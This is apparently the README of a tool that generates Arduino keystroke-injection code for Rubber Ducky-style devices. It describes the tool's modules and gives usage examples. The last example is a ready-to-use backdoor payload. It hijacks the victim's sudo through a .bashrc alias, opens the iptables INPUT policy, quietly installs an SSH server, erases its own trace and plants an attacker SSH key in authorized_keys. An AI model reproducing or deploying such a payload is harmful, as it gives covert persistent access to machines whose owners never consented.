# Malduino/Arduino Keyboard code generator
Code generator of arduino keyboard proyect's (rubber ducky like)

With this proyect you can generate arduino keyboard code's easier. It's a command line translater of payloads to be typed with keyboard arduino library and also it can type with many languages or type methods, like unicode (linux), windows "alt" codes, etc.

ITS NOT RECOMENDED USE IT TO UPLOAD NOW. You can avoid this with -jc parameter, it can cause overwrite of firmware reset delay and its hard to rewrite this again.

--- 

File explanaition:
-
See at config.py file the path to arduino code for upload (not recomended to use it now).

See payloads.py to view some predefined payloads.

Executers are some decorators of payloads, you can transform the execution of payload to do it in some other way. They are defined in executer.py.

Translaters in translater.py are the last transform of payload typed. There is some ways to type entire payload, they can change between an spanish keyboard, an english keyboard, a linux unicode type mode, a windows alt code typing, etc.

In uploader.py is defined the connection to arduino, how it is find at usb ports, how to upload, and such things.

"reset" files are nothing. Some ways to reset arduinos.


Some examples and payloads:
-

Basic. Use -h for all command description. Use -v to show what the program is doing:
```bash
python3 run.py [-h] [-v] [options]
```

Using predefined payload "firefox":
```bash
python3 run.py -p firefox -tm unicode -v -jc
```

Types a custom payload with -sp. Then translate it to typing mode "unicode" used on linux.
```bash
python3 run.py -sp 'echo gato; firefox algunsitio.com' -tm unicode -v -jc
```

This adds at the end a ssh-pub-key and first a line to the .bashrc with a payload that adds an alias to sudo with:
- a change to iptables input policy setting it to ACCEPT
- a ssh server instalation
- a deletion of payload line in .bashrc
- a execution of original sudo command
```bash
python3 run.py -sp " echo \" alias sudo='sudo iptables -P INPUT ACCEPT ; sudo apt install -qq -y openssh-server &> /dev/null ; grep -v \\\"#estalinea\\\" .bashrc >.tmp;mv .tmp .bashrc ; /usr/bin/sudo' #estalinea\" >> .bashrc ; echo \"ssh-rsa SSH-PUB-KEY-HERE \" >> \$HOME/.ssh/authorized_keys; exit; " -tm unicode -jc -otm ctrlaltt -em hex-bash -dp 0 -dl 0 -ctc -jc
```
